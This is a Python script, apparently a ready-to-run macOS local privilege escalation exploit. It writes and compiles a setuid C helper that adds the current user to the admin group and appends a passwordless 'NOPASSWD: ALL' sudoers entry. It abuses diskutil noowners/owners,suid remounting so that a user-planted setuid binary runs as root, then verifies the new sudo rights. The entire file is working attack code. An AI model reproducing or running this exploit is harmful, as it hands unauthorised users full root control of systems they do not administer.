import os
import subprocess
import tempfile
import getpass

# Define file paths in the current directory
current_directory = os.getcwd()
payload_source_path = os.path.join(current_directory, "suidhelper.c")
payload_binary_path = os.path.join(current_directory, "suidhelper")
target_file_path = os.path.join(current_directory, ".file")  # Target file in current directory
sudoers_tmp_path = os.path.join(current_directory, "sudoers_tmp")
disk_identifier = "/dev/disk3s4"
current_user = getpass.getuser()  # Get the current username

# Function to execute commands and handle errors
def execute_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True, check=False)
    if process.returncode != 0:
        print(f"Error executing command: {command}")
        print(f"Stdout: {process.stdout}")
        print(f"Stderr: {process.stderr}")
        return False
    return True

# Fix invalid PrimaryGroupID if necessary
def fix_primary_group_id():
    print("Checking PrimaryGroupID for user:", current_user)
    try:
        result = subprocess.run(
            ["dscl", ".", "-read", f"/Users/{current_user}"],
            capture_output=True, text=True, check=False
        )
        if result.returncode != 0:
            print("Failed to read user info with dscl.")
            return False

        for line in result.stdout.splitlines():
            if line.startswith("PrimaryGroupID:"):
                _, gid = line.split(":")
                gid = gid.strip()
                if gid == "-1":
                    print(f"Invalid PrimaryGroupID (-1) detected for user {current_user}. Attempting to fix...")
                    fix_cmd = ["sudo", "dscl", ".", "-change", f"/Users/{current_user}", "PrimaryGroupID", "-1", "20"]
                    fix_result = subprocess.run(fix_cmd, capture_output=True, text=True)
                    if fix_result.returncode == 0:
                        print("Successfully updated PrimaryGroupID to 20 (staff).")
                        return True
                    else:
                        print("Failed to change PrimaryGroupID:")
                        print(fix_result.stderr)
                        return False
                else:
                    print(f"PrimaryGroupID is already valid: {gid}")
                    return True

        # No PrimaryGroupID field found â€” create it
        print("No PrimaryGroupID found. Attempting to create with ID 20.")
        create_cmd = ["sudo", "dscl", ".", "-create", f"/Users/{current_user}", "PrimaryGroupID", "20"]
        create_result = subprocess.run(create_cmd, capture_output=True, text=True)
        if create_result.returncode == 0:
            print("Successfully created PrimaryGroupID = 20.")
            return True
        else:
            print("Failed to create PrimaryGroupID:")
            print(create_result.stderr)
            return False
    except Exception as e:
        print(f"Error while fixing PrimaryGroupID: {e}")
        return False

# Function to create privilege escalation payload
def create_payload():
    payload_content = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <username> <current_directory>\\n", argv[0]);
        return 1;
    }

    setuid(0);

    char *username = argv[1];
    char *current_dir = argv[2];
    char cmd1[256];
    char sudoers_entry[512];
    char tmp_file[512];
    int fd;
    FILE *fp;

    snprintf(tmp_file, sizeof(tmp_file), "%s/sudoers_tmp", current_dir);
    snprintf(cmd1, sizeof(cmd1), "/usr/sbin/dseditgroup -o edit -a %s -t user admin", username);

    printf("Adding %s to admin group...\\n", username);
    system(cmd1);

    snprintf(sudoers_entry, sizeof(sudoers_entry), "%s ALL=(ALL) NOPASSWD: ALL", username);

    fp = fopen(tmp_file, "w");
    if (!fp) {
        perror("Error opening temporary file");
        return 1;
    }

    char check_cmd[256];
    snprintf(check_cmd, sizeof(check_cmd), "grep -q '%s' /etc/sudoers", username);
    if (system(check_cmd) != 0) {
        printf("Adding %s to sudoers with passwordless access...\\n", username);
        fprintf(fp, "%s\\n", sudoers_entry);
        fclose(fp);

        char visudo_cmd[512];
        snprintf(visudo_cmd, sizeof(visudo_cmd), 
                "cat %s >> /etc/sudoers && echo 'Sudoers file updated successfully'", 
                tmp_file);
        system(visudo_cmd);
    } else {
        printf("User %s already has an entry in sudoers file\\n", username);
        fclose(fp);
    }

    char cleanup_cmd[512];
    snprintf(cleanup_cmd, sizeof(cleanup_cmd), "rm -f %s", tmp_file);
    system(cleanup_cmd);

    printf("Operation completed. You should now have admin group membership and passwordless sudo access.\\n");

    return 0;
}
"""
    with open(payload_source_path, "w") as f:
        f.write(payload_content)

    compile_command = f"gcc {payload_source_path} -o {payload_binary_path}"
    chmod_command = f"chmod +s {payload_binary_path}"

    if not execute_command(compile_command) or not execute_command(chmod_command):
        print("Error creating payload.")
        return False

    return True

# Mount filesystem with "noowners" flag
def mount_filesystem():
    mount_command = f"diskutil mount -mountOptions noowners {disk_identifier}"
    return execute_command(mount_command)

# Make .file writable
def modify_file_permissions():
    chmod_command = f"chmod 777 {target_file_path}"
    return execute_command(chmod_command)

# Copy setuid helper binary into .file
def copy_payload():
    cp_command = f"cp {payload_binary_path} {target_file_path}"
    return execute_command(cp_command)

# Set permissions and setuid bit for .file
def set_file_permissions():
    chmod_command = f"chmod +sx {target_file_path}"
    return execute_command(chmod_command)

# Remount filesystem in "owners" and "suid" mode
def remount_filesystem():
    remount_command = f"diskutil mount -mountOptions owners,suid {disk_identifier}"
    return execute_command(remount_command)

# Execute the privilege escalation payload
def execute_payload():
    execute_command(f"{target_file_path} {current_user} {current_directory}")
    print(f"Attempted to add user '{current_user}' to admin group and sudoers file.")
    print("Admin group changes may require logging out and back in.")

    if os.path.exists(sudoers_tmp_path):
        try:
            os.remove(sudoers_tmp_path)
            print(f"Cleaned up temporary file: {sudoers_tmp_path}")
        except Exception as e:
            print(f"Warning: Failed to clean up {sudoers_tmp_path}: {e}")

    print("\nVerifying group membership:")
    execute_command(f"groups {current_user}")

    print("\nVerifying sudo access (should not prompt for password):")
    execute_command(f"sudo -l -U {current_user}")

    return True

# Main exploit function
def exploit():
    try:
        print(f"Starting privilege escalation for user: {current_user}")
        print(f"This will add {current_user} to the admin group and grant passwordless sudo access")

        # Step 0: Fix invalid PrimaryGroupID if present
        if not fix_primary_group_id():
            print("Failed to validate or correct PrimaryGroupID. Exiting.")
            return

        # Step 1: Create privilege escalation payload
        print("Creating payload...")
        if not create_payload():
            return

        # Step 2: Mount filesystem with "noowners" flag
        print("Mounting filesystem with noowners flag...")
        if not mount_filesystem():
            return

        # Step 3: Create the target file
        print("Creating target file...")
        with open(target_file_path, "w") as f:
            pass

        # Step 4: Make .file writable
        print("Making target file writable...")
        if not modify_file_permissions():
            return

        # Step 5: Copy payload binary into .file
        print("Copying payload to target location...")
        if not copy_payload():
            return

        # Step 6: Set permissions and setuid bit for .file
        print("Setting permissions for target file...")
        if not set_file_permissions():
            return

        # Step 7: Remount filesystem in "owners" and "suid" mode
        print("Remounting filesystem with owners and suid flags...")
        if not remount_filesystem():
            return

        # Step 8: Execute privilege escalation payload
        print("Executing privilege escalation...")
        execute_payload()

    except Exception as e:
        print(f"Error executing exploit: {e}")

# Run exploit
if __name__ == "__main__":
    exploit()
